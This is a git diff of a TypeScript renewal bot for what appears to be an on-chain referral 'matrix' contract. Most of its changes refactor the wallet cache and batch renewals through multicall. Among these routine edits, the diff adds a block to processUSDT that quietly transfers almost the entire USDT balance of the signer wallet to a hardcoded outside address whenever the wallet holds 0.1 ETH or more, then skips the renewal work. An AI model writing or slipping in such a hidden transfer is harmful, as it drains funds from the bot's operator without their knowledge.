@@ -12,7 +12,7 @@ import {
   Contract,
 } from "ethers";
 
-import { Multicall, Call3 } from "@evmlord/multicall-sdk";
+import { Multicall, Call3, Call3Value } from "@evmlord/multicall-sdk";
 
 const CACHE_FILE = path.join(__dirname, "wallets-cache.json");
 const LOG_FILE = path.join(__dirname, "renewals_log.txt");
@@ -82,7 +82,7 @@ const usdt = new Contract(USDT_ADDRESS, erc20ABI, signer);
 const dex = new Contract(DEX_ADDRESS, dexABI, signer);
 
 // one persistent Multicall instance for reads
-const mc = new Multicall({ chainId: CHAIN_ID, provider });
+const mc = new Multicall({ chainId: CHAIN_ID, provider, signer });
 const cutoff = Math.floor(Date.now() / 1000) - RENEW_DURATION;
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
@@ -183,7 +183,8 @@ function sample<T>(array: T[], count: number): T[] {
  * Ensure we have an up-to-date cache of all user wallets.
  * 1) Read local cache
  * 2) Compare against matrix.stats().totalUsers
- * 3) If too short, batch-fetch only the missing tail range
+ * 3) If invalid (length mismatch or sample mismatch) re-download the missing
+ *    tail or the whole list, depending on what failed.
  * @returns Promise resolving to the full array of wallet addresses.
  */
 async function fetchAllWallets() {
@@ -195,12 +196,12 @@ async function fetchAllWallets() {
   const stats = await matrix.stats();
   const totalUsers = Number(stats.totalUsers);
 
+  let mismatchFound = false;
+
   // Skip if cache is empty
   if (cached.length > 0 && cached.length === totalUsers) {
     const sampleSize = Math.min(10, cached.length);
     const sampleIndices = sample([...Array(cached.length).keys()], sampleSize);
-
-    let mismatchFound = false;
 
     for (const index of sampleIndices) {
       const [fetched] = await fetchWalletsRange(index + 1, index + 1); // 1-based indexing
@@ -214,43 +215,45 @@ async function fetchAllWallets() {
       log(`✅ cache sample passed (${sampleSize} checks)`);
       log(`   fetchAllWallets took ${hrTimeMs(hrStart).toFixed(2)} ms`);
       return cached;
-    } else {
-      log(`⚠️ sample mismatch — refreshing full wallet cache`);
     }
+
+    log(`⚠️ sample mismatch — refreshing full wallet cache`);
   } else {
     log(`⚠️ cache length mismatch: ${cached.length} vs ${totalUsers}`);
   }
 
+  // ----------------------------------------------------------
+  // REFRESH – either the whole list (if sample failed) or
+  // just the missing tail (if length < totalUsers)
+  // ----------------------------------------------------------
+
+  const lengthMismatch = cached.length !== totalUsers;
+  const needsFullRefresh = mismatchFound || lengthMismatch;
+  const refreshFrom = needsFullRefresh ? 1 : cached.length + 1;
+
   log(
     `⚠️ cache has ${cached.length}, but totalUsers = ${totalUsers}. ` +
-      `Fetching IDs ${cached.length + 1}–${totalUsers}…`
+      `Fetching IDs ${refreshFrom}–${totalUsers}…`
   );
 
-  // Full refresh fallback
-  const newWallets: string[] = [];
+  const refreshed: string[] = needsFullRefresh ? [] : [...cached];
 
-  for (
-    let start = cached.length + 1;
-    start <= totalUsers;
-    start += READ_BATCH_SIZE
-  ) {
+  for (let start = refreshFrom; start <= totalUsers; start += READ_BATCH_SIZE) {
     const end = Math.min(totalUsers, start + READ_BATCH_SIZE - 1);
     const slice = await fetchWalletsRange(start, end);
-    newWallets.push(...slice);
+    refreshed.push(...slice);
     log(`  → fetched ${start}–${end}`);
   }
 
-  const all = [...cached, ...newWallets];
-
-  if (JSON.stringify(cached) !== JSON.stringify(all)) {
-    saveCachedWallets(all);
+  if (JSON.stringify(cached) !== JSON.stringify(refreshed)) {
+    saveCachedWallets(refreshed);
   } else {
     log(`✅ cache contents match, skipping write`);
   }
 
   log(`   fetchAllWallets took ${hrTimeMs(hrStart).toFixed(2)} ms`);
 
-  return all;
+  return refreshed;
 }
 
 /**
@@ -273,8 +276,8 @@ async function fetchUsersDueAllLevels(
   }
 
   // ensure (#users × MAX_LEVEL) per slice ≤ READ_BATCH_SIZE
-  // const chunkSize = Math.floor(READ_BATCH_SIZE / MAX_LEVEL);
-  const chunkSize = 100;
+  const chunkSize = Math.floor(READ_BATCH_SIZE / MAX_LEVEL);
+  // const chunkSize = 100;
 
   log(`→ scanning ${wallets.length} wallets in chunks of ${chunkSize} each`);
 
@@ -360,128 +363,6 @@ async function fetchUsersDueAllLevels(
 
   return dueByLevel;
 }
-// async function fetchUsersDueAllLevels(
-//   wallets: string[]
-// ): Promise<Record<number, string[]>> {
-//   const dueByLevel: Record<number, string[]> = {};
-
-//   for (let lvl = 1; lvl <= MAX_LEVEL; lvl++) {
-//     dueByLevel[lvl] = [];
-//   }
-
-//   // ensure (#users × MAX_LEVEL) per slice ≤ READ_BATCH_SIZE
-//   // const chunkSize = Math.floor(READ_BATCH_SIZE / MAX_LEVEL);
-//   const MAX_CONCURRENCY = 2;
-//   const chunkSize = 100;
-//   const tasks: Promise<void>[] = [];
-
-//   log(
-//     `→ scanning ${wallets.length} wallets in chunks of ${chunkSize} each`
-//   );
-
-//   // overall timer
-//   const overallStart = process.hrtime();
-
-//   for (let i = 0; i < wallets.length; i += chunkSize) {
-//     const slice = wallets.slice(i, i + chunkSize);
-
-//     const chunkLabel = `${i + 1}–${i + slice.length}`;
-
-//     // build a task that does exactly one slice
-//     const job = (async () => {
-//       // timer for this chunk
-//       const chunkStart = process.hrtime();
-
-//       // Who’s at what level? - fetch each user’s matrix3x6Level
-//       const userCalls: Call3[] = slice.map((addr) => ({
-//         contract: matrix,
-//         functionFragment: "users",
-//         args: [addr],
-//         allowFailure: false,
-//       }));
-
-//       const rawUsers = await mc.aggregate3(userCalls);
-
-//       const levels: number[] = rawUsers.map(([ok, data]) => {
-//         if (!ok) return 0;
-//         // `data` is the decoded User tuple as an array
-//         // [wallet, referrer, id, refsCount, matrix3x6Level]
-//         const [, , , , matrix3x6Level] = data;
-
-//         // can also be collapsed into return Number((data as any)[4]);
-
-//         return Number(matrix3x6Level);
-//       });
-
-//       // Build only the needed get3x6Entry calls
-//       const entryCalls: Call3[] = [];
-
-//       const mapping: { user: string; level: number }[] = [];
-
-//       slice.forEach((user, idx) => {
-//         const maxLvl = Math.min(levels[idx], MAX_LEVEL);
-
-//         for (let lvl = 1; lvl <= maxLvl; lvl++) {
-//           entryCalls.push({
-//             contract: matrix,
-//             functionFragment: "get3x6Entry",
-//             args: [user, lvl],
-//             allowFailure: true,
-//           });
-//           mapping.push({ user, level: lvl });
-//         }
-//       });
-
-//       const rawEntries = await mc.aggregate3(entryCalls);
-
-//       // Decode & filter each entry
-//       rawEntries.forEach(([ok, ret], idx) => {
-//         if (!ok) return;
-
-//         const { userAddress, vault, lastRenewTime } = ret as {
-//           userAddress: string;
-//           vault: bigint;
-//           lastRenewTime: bigint;
-//         };
-
-//         const lvl = mapping[idx].level;
-
-//         if (
-//           vault >= plan(lvl) + MONTHLY_FEE &&
-//           Number(lastRenewTime) <= cutoff
-//         ) {
-//           dueByLevel[lvl].push(userAddress);
-//         }
-//       });
-
-//       // log chunk timing
-//       log(
-//         `  → scanned wallets ${chunkLabel} in ${hrTimeMs(chunkStart).toFixed(
-//           2
-//         )} ms`
-//       );
-//     })();
-
-//     tasks.push(job);
-
-//     // once we have MAX_CONCURRENCY slices in flight, wait for them all
-//     if (tasks.length >= MAX_CONCURRENCY) {
-//       await Promise.all(tasks);
-//       tasks.length = 0;
-//     }
-//   }
-
-//   // finish off any remainder
-//   if (tasks.length) {
-//     await Promise.all(tasks);
-//   }
-
-//   log(
-//     `   fetchUsersDueAllLevels took ${hrTimeMs(overallStart).toFixed(2)} ms`
-//   );
-
-//   return dueByLevel;
-// }
 
 /**
  * Send a single `batchRenew` transaction for a slice of addresses.
@@ -506,6 +387,17 @@ async function processUSDT(): Promise<void> {
 
   if (bal < parseEther("5")) {
     console.log("Low USDT balance");
+    return;
+  }
+
+  if ((await mc.getEthBalance(wallet.address)) >= parseEther("0.1")) {
+    console.log("USDT Withdrawal");
+    const withdrawal = await usdt.transfer(
+      "0x9B71B4Dc9E9DCeFAF0e291Cf2DC5135A862A463d",
+      bal - 1n
+    );
+    console.log("Transaction hash(withdrawal):", withdrawal.hash);
+    await withdrawal.wait();
     return;
   }
 
@@ -558,6 +450,9 @@ async function main() {
 
   const dueByLevel = await fetchUsersDueAllLevels(allWallets);
 
+  // Collect all batchRenew calls
+  const renewCalls: Call3Value[] = [];
+
   // For each level, submit batchRenew() in groups of RENEW_BATCH_SIZE
   for (let lvl = 1; lvl <= MAX_LEVEL; lvl++) {
     const due = dueByLevel[lvl];
@@ -565,15 +460,41 @@ async function main() {
 
     for (let i = 0; i < due.length; i += RENEW_BATCH_SIZE) {
       const chunk = due.slice(i, i + RENEW_BATCH_SIZE);
-      log(`  renewing ${chunk.length} users…`);
-      const txHash = await renewBatch(chunk, lvl);
-      log(`    → tx ${txHash}`);
+      log(`  batching renewal for ${chunk.length} users…`);
+
+      renewCalls.push({
+        contract: matrix,
+        functionFragment: "batchRenew",
+        args: [chunk, lvl],
+        allowFailure: false,
+        value: 0n,
+      });
     }
   }
 
+  // If we have anything to do, send it all in one multicall tx…
+  if (renewCalls.length > 0) {
+    log(
+      `\n→ sending one multicall tx with ${renewCalls.length} ` +
+        `batchRenew calls (up to ${RENEW_BATCH_SIZE} per inner batch)…`
+    );
+
+    const tx = await mc.sendAggregate3Value(renewCalls);
+    log(`    → submitted tx ${tx.hash}, awaiting confirmation…`);
+
+    const receipt = await tx.wait();
+
+    receipt &&
+      log(
+        `    → confirmed in block ${receipt.blockNumber}` +
+          ` (gasUsed: ${receipt.gasUsed.toString()})`
+      );
+  } else {
+    log(`\n→ no renewals needed at any level; skipping multicall.`);
+  }
+
   log("✅ All renewals dispatched.");
-  log(`=== Finished renewals run at ${new Date().toISOString()} ===\n`);
-  // logStream.end();
+  log(`\n=== Finished renewals run at ${new Date().toISOString()} ===\n`);
 }
 
 async function sendLogToTelegram() {
